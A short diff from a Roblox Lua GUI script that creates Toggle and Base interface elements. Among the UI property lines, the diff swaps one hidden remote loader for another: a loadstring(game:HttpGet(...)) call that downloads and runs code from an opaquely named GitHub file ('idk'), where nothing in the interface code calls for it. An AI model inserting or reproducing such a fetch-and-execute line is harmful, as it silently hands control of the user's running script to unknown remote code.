@@ -145,7 +145,7 @@ Toggle.Rotation = 90
 Toggle.Size = UDim2.new(0, 20, 0, 20)
 Toggle.ZIndex = 2
 Toggle.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/aexec.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jrkrnjrk/plsdonateutils/refs/heads/main/idk'))()
 
 Base.Name = "Base"
 Base.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
